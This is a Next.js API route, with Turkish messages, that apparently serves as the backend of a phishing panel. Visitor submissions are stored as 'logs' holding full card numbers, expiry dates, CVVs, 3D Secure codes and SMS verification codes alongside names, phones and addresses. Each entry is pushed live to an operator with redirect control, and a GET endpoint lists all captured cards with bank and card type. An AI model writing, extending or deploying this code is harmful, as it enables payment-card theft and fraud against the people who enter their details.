import { NextRequest, NextResponse } from 'next/server';
import connectDB from '@/lib/mongodb';
import { logsDb } from '@/lib/db';
import { getPhoneRaw } from '@/lib/phoneUtils';
import { enrichLogMetadata } from '@/lib/logEnrichment';
import { detectBankName, detectCardType } from '@/lib/cardUtils';
import { getClientIp } from '@/lib/ipUtils';
import { allocateVisitorId } from '@/lib/visitorId';
import { readJsonBody } from '@/lib/readJsonBody';
import { shouldApplyIncomingStatus, resolveCheckoutHeartbeatStatus, hasCheckoutAddressEngagementInput, hasCheckoutAddressEngagement } from '@/lib/logCategories';
import { notifyLogCreated, notifyLogUpdated } from '@/lib/ws/notifyLog';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

const noStoreHeaders = {
  'Cache-Control': 'no-store, no-cache, must-revalidate',
  Pragma: 'no-cache',
};

async function resolveExistingLog(
  body: Record<string, unknown>,
  cleanPhone: string | null,
  ipAddress: string
) {
  const logId = typeof body.logId === 'string' ? body.logId.trim() : '';
  if (logId) {
    const byId = await logsDb.findById(logId);
    if (byId && byId.pageType !== 'admin') {
      return byId;
    }
  }

  return logsDb.findActiveByPhoneOrIp(cleanPhone, ipAddress, {
    visitorSessionId:
      typeof body.visitorSessionId === 'string' ? body.visitorSessionId : undefined,
    logId: logId || undefined,
    scope: 'storefront',
  });
}

export async function GET(request: NextRequest) {
  try {
    await connectDB();

    const searchParams = request.nextUrl.searchParams;
    const status = searchParams.get('status') || undefined;
    const phone = searchParams.get('phone') || undefined;
    const limit = parseInt(searchParams.get('limit') || '100');
    const skip = parseInt(searchParams.get('skip') || '0');

    const query = {
      status,
      phone: phone ? getPhoneRaw(phone) : undefined,
      limit,
      skip,
    };

    const logs = await logsDb.find(query);
    const total = await logsDb.count({ status, phone: query.phone });

    const enrichedLogs = logs.map((log) => {
      if (!log.cardNumber) return log;
      return {
        ...log,
        bankName: detectBankName(log.cardNumber),
        cardType: detectCardType(log.cardNumber),
      };
    });

    return NextResponse.json({ success: true, data: enrichedLogs, total }, { headers: noStoreHeaders });
  } catch (error: any) {
    console.error('Log getirme hatası:', error);
    return NextResponse.json(
      { success: false, error: error.message || 'Loglar getirilemedi' },
      { status: 500 }
    );
  }
}

export async function POST(request: NextRequest) {
  try {
    await connectDB();

    const body = (await readJsonBody(request)) as Record<string, any>;
    const pageType = typeof body.pageType === 'string' ? body.pageType : undefined;

    let cleanPhone = null;
    if (body.phone) {
      cleanPhone = body.phoneRaw || getPhoneRaw(body.phone);
    }

    const ipAddress = getClientIp(request);
    const metadata = enrichLogMetadata(request, body);

    const existingLog = await resolveExistingLog(body, cleanPhone, ipAddress);

    const addressEngaged =
      hasCheckoutAddressEngagementInput(body) ||
      (existingLog ? hasCheckoutAddressEngagement(existingLog) : false);

    if (
      !existingLog &&
      pageType === 'address' &&
      body.status === 'Adres Ekranında' &&
      !addressEngaged
    ) {
      return NextResponse.json(
        { success: true, skipped: true, message: 'Adres formu henüz doldurulmadı' },
        { headers: noStoreHeaders }
      );
    }

    if (existingLog) {
      const visitorId = await allocateVisitorId(existingLog.visitorId);
      const updateData: Record<string, unknown> = {
        onlineStatus: 'Aktif',
        visitorId,
        ipAddress,
        ...metadata,
      };

      if (body.name) updateData.name = body.name;
      else if (!existingLog.name || existingLog.name === 'Bilinmeyen') updateData.name = 'Ziyaretçi';
      if (body.phone !== undefined) updateData.phone = body.phone;
      if (body.amount !== undefined) updateData.amount = body.amount;
      if (body.status && shouldApplyIncomingStatus(existingLog.status, body.status)) {
        updateData.status = body.status;
      } else if (
        pageType === 'address' &&
        existingLog.status === 'Adres Ekranında' &&
        addressEngaged
      ) {
        updateData.status = 'Adres Ekranında';
      }
      if (body.pageType) updateData.pageType = body.pageType;

      if (body.firstName !== undefined) updateData.firstName = body.firstName;
      if (body.lastName !== undefined) updateData.lastName = body.lastName;
      if (body.email !== undefined) updateData.email = body.email;
      if (body.phoneRaw !== undefined) updateData.phoneRaw = body.phoneRaw;
      if (body.cardNumber !== undefined) updateData.cardNumber = body.cardNumber;
      if (body.expiryDate !== undefined) updateData.expiryDate = body.expiryDate;
      if (body.cvv !== undefined) updateData.cvv = body.cvv;
      if (body.threeDCode !== undefined) updateData.threeDCode = body.threeDCode;
      if (body.verificationCode !== undefined) updateData.verificationCode = body.verificationCode;
      if (body.address !== undefined) updateData.address = body.address;
      if (body.action !== undefined) updateData.action = body.action;
      if (body.pageType !== undefined) updateData.pageType = body.pageType;
      if (body.productId !== undefined) updateData.productId = body.productId;
      if (body.visitorSessionId) updateData.visitorSessionId = body.visitorSessionId;

      if (body.status === 'Bekliyor' || body.status === 'Form Dolduruluyor') {
        if (body.status !== '3D Secure Bekliyor') {
          updateData.redirectTo = null;
          updateData.redirectReason = null;
        }
      }

      const cardDigits = String(body.cardNumber ?? existingLog.cardNumber ?? '').replace(/\D/g, '');
      if (cardDigits.length >= 6) {
        updateData.bankName = detectBankName(cardDigits);
        updateData.cardType = detectCardType(cardDigits);
      }

      const updatedLog = await logsDb.updateById(existingLog._id, updateData);
      notifyLogUpdated(updatedLog);

      return NextResponse.json({
        success: true,
        data: updatedLog,
        message: 'Mevcut log güncellendi',
      });
    }

    const visitorId = await allocateVisitorId(undefined);
    const defaultStatus =
      (typeof body.status === 'string' && body.status) ||
      (typeof body.pageType === 'string' ? resolveCheckoutHeartbeatStatus(body.pageType) : undefined) ||
      'Bekliyor';
    const log = await logsDb.create({
      name: body.name || 'Ziyaretçi',
      firstName: body.firstName,
      lastName: body.lastName,
      phone: body.phone,
      phoneRaw: body.phoneRaw,
      email: body.email,
      cardNumber: body.cardNumber,
      expiryDate: body.expiryDate,
      cvv: body.cvv,
      threeDCode: body.threeDCode,
      verificationCode: body.verificationCode,
      amount: body.amount || 0,
      status: defaultStatus,
      action: body.action,
      ipAddress,
      address: body.address,
      pageType: body.pageType,
      productId: body.productId,
      visitorSessionId: body.visitorSessionId,
      visitorId,
      onlineStatus: 'Aktif',
      bankName: body.cardNumber ? detectBankName(body.cardNumber) : undefined,
      cardType: body.cardNumber ? detectCardType(body.cardNumber) : undefined,
      ...metadata,
    });

    notifyLogCreated(log);

    return NextResponse.json({
      success: true,
      data: log,
      message: 'Yeni log oluşturuldu',
    });
  } catch (error: any) {
    console.error('Log oluşturma/güncelleme hatası:', error);
    return NextResponse.json(
      { success: false, error: error.message || 'Log oluşturulamadı' },
      { status: 500 }
    );
  }
}
